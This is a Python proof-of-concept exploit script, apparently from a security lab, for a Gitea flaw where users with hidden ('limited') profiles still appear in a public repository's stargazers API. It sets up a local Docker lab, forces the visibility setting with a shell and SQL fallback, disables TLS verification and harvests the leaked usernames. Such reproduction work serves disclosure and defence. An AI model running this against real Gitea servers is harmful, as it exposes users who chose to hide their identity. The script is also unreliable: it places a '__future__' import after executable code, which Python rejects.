#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#
#  CVE: gitea-stargazers-hidden (Medium: 5.3)
#  Vendor: Gitea (Gitea)
#  Versions: Gitea <= 1.27.3
#  Impact: Information Disclosure (Hidden Usernames via Stargazers)
#  Requires: unauthenticated GET /api/v1/repos/{owner}/{repo}/stargazers
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "gitea-stargazers-hidden"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

from __future__ import annotations

import base64
import json
import os
import ssl
import subprocess
import sys
import urllib.error
import urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent
BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18133").rstrip("/")
CTX = ssl._create_unverified_context()

ADMIN = "labadmin"
OWNER = "pubowner"
LIMITED = "hidstar"
PASS = "LabPass123!"
REPO = "labstar"
# VisibleTypePublic=0, VisibleTypeLimited=1, VisibleTypePrivate=2
VIS_LIMITED = 1


def req(
    method: str,
    path: str,
    data: dict | None = None,
    auth: tuple[str, str] | None = None,
    query: str = "",
) -> tuple[int, str]:
    hdrs = {"Content-Type": "application/json", "User-Agent": "gitea-stargazers-hidden-lab"}
    if auth:
        tok = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
        hdrs["Authorization"] = "Basic " + tok
    body = None if data is None else json.dumps(data).encode()
    url = BASE + path + query
    r = urllib.request.Request(url, data=body, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(r, timeout=30, context=CTX) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def compose(*args: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", *args],
        cwd=HERE,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )


def gitea_exec(*args: str) -> subprocess.CompletedProcess[str]:
    return compose("exec", "-T", "-u", "git", "gitea", *args)


def create_user(name: str, email: str, *, admin: bool = False) -> None:
    cmd = [
        "gitea",
        "admin",
        "user",
        "create",
        "--username",
        name,
        "--password",
        PASS,
        "--email",
        email,
        "--must-change-password=false",
    ]
    if admin:
        cmd.append("--admin")
    p = gitea_exec(*cmd)
    out = (p.stdout or "") + (p.stderr or "")
    print(f"IOC create-user name={name} rc={p.returncode} snippet={out[-200:]!r}")


def names_in(payload: object) -> set[str]:
    names: set[str] = set()
    if isinstance(payload, list):
        for item in payload:
            if isinstance(item, dict):
                for key in ("login", "username", "name"):
                    val = item.get(key)
                    if isinstance(val, str) and val:
                        names.add(val)
    return names


def set_visibility_limited() -> bool:
    s, b = req(
        "PATCH",
        f"/api/v1/admin/users/{LIMITED}",
        {"visibility": "limited"},
        auth=(ADMIN, PASS),
    )
    print(f"IOC admin-patch-visibility status={s} snippet={b[:220]!r}")
    if s == 200 and "limited" in b:
        return True

    # SQL fallback: user.visibility 1 = limited
    p = compose(
        "exec",
        "-T",
        "gitea",
        "sh",
        "-c",
        "command -v sqlite3 >/dev/null || apk add --no-cache sqlite >/dev/null; "
        f"sqlite3 /data/gitea/gitea.db \"UPDATE user SET visibility={VIS_LIMITED} WHERE lower(name)=lower('{LIMITED}'); "
        f"SELECT name, visibility FROM user WHERE lower(name)=lower('{LIMITED}');\"",
    )
    out = ((p.stdout or "") + (p.stderr or "")).strip()
    print(f"IOC sql-visibility rc={p.returncode} out={out[:300]!r}")
    return str(VIS_LIMITED) in out


def main() -> None:
    print(f"IOC base={BASE}")
    os.environ.setdefault("COMPOSE_PROJECT_NAME", "gitea-stargazers-hidden")

    s, b = req("GET", "/api/v1/version")
    print(f"IOC version status={s} snippet={b[:160]!r}")
    if s != 200:
        print("FAIL Gitea version endpoint not ready")
        raise SystemExit(1)

    create_user(ADMIN, "labadmin@localhost.invalid", admin=True)
    create_user(OWNER, "pubowner@localhost.invalid")
    create_user(LIMITED, "hidstar@localhost.invalid")

    s, b = req("GET", "/api/v1/user", auth=(ADMIN, PASS))
    print(f"IOC admin-login status={s} snippet={b[:160]!r}")
    if s != 200:
        print("FAIL admin login")
        raise SystemExit(1)

    s, b = req(
        "POST",
        "/api/v1/user/repos",
        {"name": REPO, "private": False, "auto_init": True, "description": "public lab repo"},
        auth=(OWNER, PASS),
    )
    print(f"IOC create-repo status={s} snippet={b[:200]!r}")
    if s not in (200, 201, 409):
        # 409 if rerun
        s2, b2 = req("GET", f"/api/v1/repos/{OWNER}/{REPO}")
        print(f"IOC repo-get status={s2} snippet={b2[:160]!r}")
        if s2 != 200:
            print("FAIL create public repo")
            raise SystemExit(1)

    s, b = req("PUT", f"/api/v1/user/starred/{OWNER}/{REPO}", auth=(LIMITED, PASS))
    print(f"IOC star status={s} snippet={b[:160]!r}")
    if s not in (204, 200):
        print("FAIL limited user could not star public repo")
        raise SystemExit(1)

    s, b = req("PUT", f"/api/v1/repos/{OWNER}/{REPO}/subscription", auth=(LIMITED, PASS))
    print(f"IOC watch status={s} snippet={b[:160]!r}")

    s, b = req("PUT", f"/api/v1/user/following/{OWNER}", auth=(LIMITED, PASS))
    print(f"IOC follow status={s} snippet={b[:160]!r}")

    if not set_visibility_limited():
        print("FAIL could not set limited visibility")
        raise SystemExit(1)

    s_user, b_user = req("GET", f"/api/v1/users/{LIMITED}")
    print(f"IOC unauth-user-get status={s_user} snippet={b_user[:180]!r}")
    s_owner, b_owner = req("GET", f"/api/v1/users/{OWNER}")
    print(f"IOC unauth-owner-get status={s_owner} snippet={b_owner[:120]!r}")
    if s_user != 404:
        print("FAIL limited user profile is not hidden (expected 404)")
        raise SystemExit(1)
    if s_owner != 200:
        print("FAIL public owner profile not visible")
        raise SystemExit(1)

    s_star, b_star = req("GET", f"/api/v1/repos/{OWNER}/{REPO}/stargazers")
    print(f"IOC unauth-stargazers status={s_star} snippet={b_star[:400]!r}")
    if s_star != 200:
        print("FAIL unauth stargazers request failed")
        raise SystemExit(1)
    try:
        star_json = json.loads(b_star)
    except json.JSONDecodeError:
        print("FAIL stargazers body is not JSON")
        raise SystemExit(1)
    star_names = names_in(star_json)
    print(f"IOC stargazer-names={sorted(star_names)}")
    if LIMITED not in star_names:
        print("FAIL stargazers omit the limited user")
        raise SystemExit(1)

    s_sub, b_sub = req("GET", f"/api/v1/repos/{OWNER}/{REPO}/subscribers")
    print(f"IOC unauth-watchers status={s_sub} snippet={b_sub[:300]!r}")
    if s_sub == 200:
        try:
            sub_names = names_in(json.loads(b_sub))
        except json.JSONDecodeError:
            sub_names = set()
        print(f"IOC watcher-names={sorted(sub_names)} leak={LIMITED in sub_names}")

    s_fol, b_fol = req("GET", f"/api/v1/users/{OWNER}/followers")
    print(f"IOC unauth-followers-api status={s_fol} snippet={b_fol[:220]!r}")
    if s_fol == 200:
        try:
            fol_names = names_in(json.loads(b_fol))
        except json.JSONDecodeError:
            fol_names = set()
        print(f"IOC follower-names={sorted(fol_names)} leak={LIMITED in fol_names}")
        if LIMITED in fol_names:
            print("IOC followers-negative failed (limited user listed)")
        else:
            print("IOC followers-negative ok (limited user omitted)")

    s_web, b_web = req("GET", f"/{OWNER}", query="?tab=followers")
    web_hit = LIMITED in b_web
    print(f"IOC unauth-followers-web status={s_web} limited-in-html={web_hit} snippet={b_web[:120]!r}")

    print("SUCCESS GITEA-STARGAZERS-HIDDEN")


if __name__ == "__main__":
    main()

